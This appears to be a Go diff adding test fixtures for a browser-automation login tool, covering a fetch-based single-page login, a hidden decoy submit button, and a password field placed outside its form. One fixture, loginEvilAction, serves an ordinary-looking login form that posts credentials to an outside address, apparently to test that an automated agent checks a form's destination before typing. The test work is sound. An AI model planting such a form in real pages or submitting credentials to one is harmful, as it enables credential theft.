@@ -377,3 +377,122 @@ func loginFormWithOp(note string) string {
 </form>
 `, note, LoginFormID, LoginUserField, LoginPassField, LoginOpField, LoginOpValue)
 }
+
+// loginSPA models a single-page login: the submit handler calls
+// preventDefault(), authenticates over fetch, and removes the form. No document
+// navigation ever happens.
+//
+// Requiring a navigation to conclude a submission burned the whole login budget
+// here and reported failure on a sign-in that had plainly worked.
+func (f *fixture) loginSPA(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodPost {
+		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
+		if err := r.ParseForm(); err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			return
+		}
+		if r.PostFormValue(LoginUserField) != LoginUser || r.PostFormValue(LoginPassField) != LoginPass {
+			w.WriteHeader(http.StatusUnauthorized)
+			return
+		}
+		setSession(w)
+		w.WriteHeader(http.StatusNoContent)
+		return
+	}
+	f.html(w, fmt.Sprintf(`<!doctype html>
+<meta charset="utf-8">
+<title>sign in</title>
+<div id="app">
+<form id=%q method="post" action="/login-spa">
+  <input type="text" name=%q>
+  <input type="password" name=%q>
+  <button type="submit">Sign in</button>
+</form>
+</div>
+<script>
+document.getElementById(%q).addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const body = new URLSearchParams(new FormData(e.target));
+  const r = await fetch("/login-spa", {method: "POST", body});
+  if (r.ok) { document.getElementById("app").innerHTML = "<h1>signed in</h1>"; }
+});
+</script>
+`, LoginFormID, LoginUserField, LoginPassField, LoginFormID))
+}
+
+// loginSecondButton puts a display:none submit control BEFORE the usable one.
+//
+// querySelector returns only the first match, so picking "the" submit control
+// without checking each in turn reports the form as unclickable and hands the
+// hidden control to requestSubmit — whose name/value then produce a different
+// request than clicking the button a person would.
+func (f *fixture) loginSecondButton(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodPost {
+		r.Body = http.MaxBytesReader(w, r.Body, maxFormBytes)
+		if err := r.ParseForm(); err != nil {
+			w.WriteHeader(http.StatusBadRequest)
+			f.write(w, "bad form")
+			return
+		}
+		okCreds := r.PostFormValue(LoginUserField) == LoginUser &&
+			r.PostFormValue(LoginPassField) == LoginPass
+		// The hidden control would post op=decoy; only the visible one is right.
+		if !okCreds || r.PostFormValue(LoginOpField) != LoginOpValue {
+			w.Header().Set("Content-Type", "text/html; charset=utf-8")
+			w.WriteHeader(http.StatusOK)
+			f.write(w, "<p>wrong submitter or credentials</p>")
+			return
+		}
+		setSession(w)
+		http.Redirect(w, r, "/private", http.StatusSeeOther)
+		return
+	}
+	f.html(w, fmt.Sprintf(`<!doctype html>
+<meta charset="utf-8">
+<title>sign in</title>
+<form id=%q method="post" action="/login-secondbutton">
+  <input type="text" name=%q>
+  <input type="password" name=%q>
+  <input type="submit" name=%q value="decoy" style="display:none">
+  <input type="submit" name=%q value=%q>
+</form>
+`, LoginFormID, LoginUserField, LoginPassField, LoginOpField, LoginOpField, LoginOpValue))
+}
+
+// loginOutside associates the password input with the form through the form=
+// attribute while placing it outside the form element. That is valid HTML: the
+// browser includes it in form.elements and submits it normally, but a
+// descendant selector never finds it.
+func (f *fixture) loginOutside(w http.ResponseWriter, r *http.Request) {
+	if r.Method == http.MethodPost {
+		f.loginSubmit(w, r)
+		return
+	}
+	f.html(w, fmt.Sprintf(`<!doctype html>
+<meta charset="utf-8">
+<title>sign in</title>
+<form id=%q method="post" action="/login-outside">
+  <input type="text" name=%q>
+  <input type="submit" value="Sign in">
+</form>
+<div class="sidebar">
+  <input type="password" name=%q form=%q>
+</div>
+`, LoginFormID, LoginUserField, LoginPassField, LoginFormID))
+}
+
+// loginEvilAction serves an ordinary-looking form on an allowed page whose
+// action posts the credentials to another origin. A cross-origin form
+// submission needs no CORS permission, so nothing in the browser stops it —
+// the destination has to be checked before anything is typed.
+func (f *fixture) loginEvilAction(w http.ResponseWriter, _ *http.Request) {
+	f.html(w, fmt.Sprintf(`<!doctype html>
+<meta charset="utf-8">
+<title>sign in</title>
+<form id=%q method="post" action="http://169.254.169.254/collect">
+  <input type="text" name=%q>
+  <input type="password" name=%q>
+  <input type="submit" value="Sign in">
+</form>
+`, LoginFormID, LoginUserField, LoginPassField))
+}
